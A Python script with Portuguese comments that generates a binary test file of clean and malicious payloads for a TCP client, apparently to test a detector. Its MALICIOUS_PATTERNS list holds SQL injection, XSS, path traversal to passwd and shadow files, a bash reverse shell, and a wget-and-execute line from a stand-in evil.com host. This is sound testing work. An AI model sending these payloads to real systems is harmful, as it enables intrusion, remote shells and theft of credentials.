#!/usr/bin/env python3
"""
Gerador de payloads para o cliente TCP.

Uso:
  python3 scripts/gen_payloads.py <count> [--ratio 60] [--seed 42] [--out FILE]

Exemplos:
  python3 scripts/gen_payloads.py 100000
  python3 scripts/gen_payloads.py 500000 --ratio 70
  python3 scripts/gen_payloads.py 1000000 --out data/payloads/custom.bin

Formato do arquivo gerado (binário):
  [4 bytes] número de payloads (big-endian uint32)
  Para cada payload:
    [4 bytes] tamanho em bytes (big-endian uint32)
    [N bytes] dados do payload
"""

import argparse
import os
import random
import string
import struct

MALICIOUS_PATTERNS = [
    "' OR '1'='1'; DROP TABLE users; --",
    "UNION SELECT username, password FROM users--",
    "1; INSERT INTO logs VALUES ('hacked')--",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:eval(atob('YWxlcnQoMSk='))",
    "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "| wget http://evil.com/shell.sh -O /tmp/s && chmod +x /tmp/s && /tmp/s",
    "../../../../etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fshadow",
]

CLEAN_CHARS = string.ascii_letters + string.digits + " .,!?-_:/\n\t"


def gen_clean_payload(rng: random.Random) -> bytes:
    size = rng.randint(512, 2048)
    return "".join(rng.choices(CLEAN_CHARS, k=size)).encode("utf-8")


def gen_malicious_payload(rng: random.Random) -> bytes:
    pattern = rng.choice(MALICIOUS_PATTERNS)
    prefix = "".join(rng.choices(CLEAN_CHARS, k=rng.randint(50, 200)))
    suffix = "".join(rng.choices(CLEAN_CHARS, k=rng.randint(50, 200)))
    return f"{prefix}{pattern}{suffix}".encode("utf-8")


def build_sequence(n: int, benign_pct: int, rng: random.Random) -> list[bytes]:
    n_clean = round(n * benign_pct / 100)
    n_malicious = n - n_clean
    seq = (
        [gen_clean_payload(rng) for _ in range(n_clean)]
        + [gen_malicious_payload(rng) for _ in range(n_malicious)]
    )
    rng.shuffle(seq)
    return seq


def write_payloads(path: str, payloads: list[bytes]) -> None:
    os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
    with open(path, "wb") as f:
        f.write(struct.pack(">I", len(payloads)))
        for p in payloads:
            f.write(struct.pack(">I", len(p)))
            f.write(p)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Gera arquivo de payloads para o cliente TCP."
    )
    parser.add_argument("count", type=int, help="Número total de mensagens")
    parser.add_argument(
        "--ratio",
        type=int,
        default=60,
        metavar="BENIGN_PCT",
        help="Percentual de mensagens limpas, 0-100 (padrão: 60)",
    )
    parser.add_argument(
        "--seed", type=int, default=42, help="Semente aleatória (padrão: 42)"
    )
    parser.add_argument(
        "--out",
        type=str,
        default=None,
        help="Arquivo de saída (padrão: data/payloads/payloads_<N>_<B><M>.bin)",
    )
    args = parser.parse_args()

    if not (0 <= args.ratio <= 100):
        parser.error("--ratio deve estar entre 0 e 100")

    benign_pct = args.ratio
    malicious_pct = 100 - benign_pct

    if args.out is None:
        out_path = f"data/payloads/payloads_{args.count}_{benign_pct}{malicious_pct}.bin"
    else:
        out_path = args.out

    rng = random.Random(args.seed)

    print(
        f"Gerando {args.count:,} payloads "
        f"({benign_pct}% limpos / {malicious_pct}% maliciosos, seed={args.seed})..."
    )
    payloads = build_sequence(args.count, benign_pct, rng)

    write_payloads(out_path, payloads)
    size_mb = os.path.getsize(out_path) / 1024 / 1024
    print(f"Salvo em: {out_path}  ({size_mb:.1f} MB, {len(payloads):,} payloads)")


if __name__ == "__main__":
    main()
